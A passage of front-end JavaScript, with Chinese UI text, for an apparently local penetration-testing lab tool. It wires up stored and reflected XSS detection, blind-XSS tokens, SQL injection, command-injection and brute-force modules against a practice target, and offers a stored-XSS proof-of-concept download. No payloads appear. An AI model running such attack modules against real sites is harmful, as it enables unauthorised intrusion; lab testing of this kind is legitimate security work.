    const submitUrl = $('#xssSubmitUrl').value.trim();
    const verifyUrl = $('#xssVerifyUrl').value.trim() || submitUrl;
    if (!submitUrl) { toast('请填写提交 URL', 'warn'); return; }
    try {
      const task = await runTask('/api/xss/stored', {
        target: targetOf('xss'),
        submit_url: submitUrl,
        verify_url: verifyUrl,
        name_field: $('#xssNameField').value.trim() || 'txtName',
        message_field: $('#xssMsgField').value.trim() || 'mtxMessage',
        extra: $('#xssExtra').value.trim(),
        deep: !!$('#xssStoredDeep')?.checked,
      }, { btn, label: '提交中' });
      const result = task.result || {};
      X.result = result;
      X.selected = new Set((result.executable || []).map((row) => row.payload));
      renderXssLevel(result);
      renderXssTable(result);
      if (result.poc_html) {
        X.poc = { html: result.poc_html, links: [], markdown: storedMarkdown(result) };
        X.tab = 'html';
        $$('#xssPocTabs .tab').forEach((tab) => tab.classList.toggle('active', tab.dataset.tab === 'html'));
        $('#xssPocActions').hidden = false;
        $('#xssDownloadStored').hidden = false;
        renderPoc();
      }
      toast(`存储型检测完成：写入 ${result.stored_count || 0} 条，可用 ${(result.executable || []).length} 个`,
        (result.executable || []).length ? 'ok' : 'warn');
    } catch { /* handled */ }
  }

  $$('#xssMode .seg-btn').forEach((btn) => btn.addEventListener('click', () => {
    const mode = btn.dataset.mode;
    state.xss.mode = mode;
    $$('#xssMode .seg-btn').forEach((el) => el.classList.toggle('active', el === btn));
    $('#xssStoredBox').hidden = mode !== 'stored';
    $('#xssParamField').hidden = mode === 'stored';
    $('#xssVariants').disabled = mode === 'stored';
    $('#xssPoc').disabled = mode === 'stored';
    $('#xssTable').innerHTML = '';
    $('#xssVariantsBox').innerHTML = '';
    $('#xssLevel').innerHTML = `<div class="level-badge idle">WAITING</div>
      <div><strong>${mode === 'stored' ? '存储型检测' : '反射型检测'}</strong>
      <p>${mode === 'stored' ? '提交无害载荷到留言板，再从校验页面确认是否被持久化输出。' : '依次发送 8 种无害向量，判断是否原样反射、被编码或被拦截。'}</p></div>`;
    toast(mode === 'stored' ? '已切换到存储型模式，注意会写入留言板' : '已切换到反射型模式', 'info');
  }));

  $('#xssDownloadStored')?.addEventListener('click', () => {
    if (X.poc?.html) download('stored-xss-poc.html', X.poc.html, 'text/html');
  });

  /* ---------------- misc ---------------- */
  function download(filename, content, type) {
    const blob = new Blob([content], { type: type || 'text/plain;charset=utf-8' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    link.remove();
    setTimeout(() => URL.revokeObjectURL(link.href), 3000);
  }

  function toCsv(columns, rows) {
    const cell = (value) => `"${String(value ?? '').replace(/"/g, '""')}"`;
    const lines = [columns.map(cell).join(',')];
    rows.forEach((row) => lines.push(columns.map((col) => cell(row[col])).join(',')));
    return '\ufeff' + lines.join('\r\n');
  }

  $$('[data-goto]').forEach((btn) => btn.addEventListener('click', () => go(btn.dataset.goto)));
  $$('.nav-item').forEach((item) => item.addEventListener('click', () => go(item.dataset.page)));

  $('#consoleClear')?.addEventListener('click', () => { consoleBody.innerHTML = ''; logLines = 0; });
  $('#consoleMin')?.addEventListener('click', (event) => {
    document.body.classList.toggle('console-min');
    event.currentTarget.textContent = document.body.classList.contains('console-min') ? 'MAX' : 'MIN';
  });

  document.addEventListener('keydown', (event) => {
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
      const map = { dashboard: '#dashCheck', sqli: '#sqliAuto', xss: '#xssScan', cmdi: '#cmdiProbe', brute: '#bruteRun', history: '#historyRefresh' };
      const btn = $(map[state.page]);
      if (btn && !btn.disabled) { event.preventDefault(); btn.click(); }
    }
  });

  function tickClock() {
    const now = new Date();
    $('#clock').textContent = now.toLocaleTimeString('zh-CN', { hour12: false });
  }

  function init() {
    tickClock();
    setInterval(tickClock, 1000);
    initPersist();

    ['sqli', 'xss'].forEach((prefix) => renderParams(prefix));
    ['sqli', 'xss'].forEach((prefix) => {
      const input = $(`#${prefix}Url`);
      if (input) input.addEventListener('change', () => renderParams(prefix));
      const dataInput = $(`#${prefix}Data`);
      if (dataInput) dataInput.addEventListener('change', () => renderParams(prefix));
    });
    $('#cmdiParams')?.addEventListener('change', () => {
      const box = $('#cmdiChips');
      if (box) box.innerHTML = `<span class="chip chip-cyan">参数</span><span class="hint">${esc($('#cmdiParams').value)}</span>`;
    });

    const page = (location.hash || '').replace('#/', '');
    go(page || 'dashboard', false);

    loadDefaults();
    loadDashboard();
    refreshProxyPill();
    renderProfiles();

    /* Cookie 失效巡检：进页面查一次，之后每 5 分钟一次，切回标签页时再补一次 */
    setTimeout(() => checkSession(true), 1600);
    setInterval(() => checkSession(), 5 * 60 * 1000);
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) checkSession();
    });

    $('#blindToken').value = 'bx' + Date.now().toString(36).slice(-4)
      + Math.random().toString(36).slice(2, 5);
    refreshBlindPayload();
    loadHits();

    const savedLevel = localStorage.getItem('seclab.security') || currentSecurity();
    $('#secLevel').value = savedLevel;
    if (savedLevel !== currentSecurity()) applySecurity(savedLevel);
    setInterval(() => { if (state.page === 'tasks') loadTasks(); }, 3000);
    setInterval(() => {
      if (state.page === 'xss' && $('#blindAuto')?.checked) loadHits();
    }, 4000);
    if (!$('#sqliCheckOut').innerHTML) $('#sqliCheckOut').innerHTML = '<span class="hint">建议先点一次连接测试，确认 Cookie 与靶场状态</span>';

    api('/api/health').then(() => {
      setConsoleState('READY');
      logConsole('sys', '本地引擎就绪 · 仅监听 127.0.0.1 · 默认仅允许内网 / 本机靶场');
    }).catch(() => {
      setConsoleState('OFFLINE');
      logConsole('err', '无法访问后端 /api/health');
    });
  }

  init();
})();
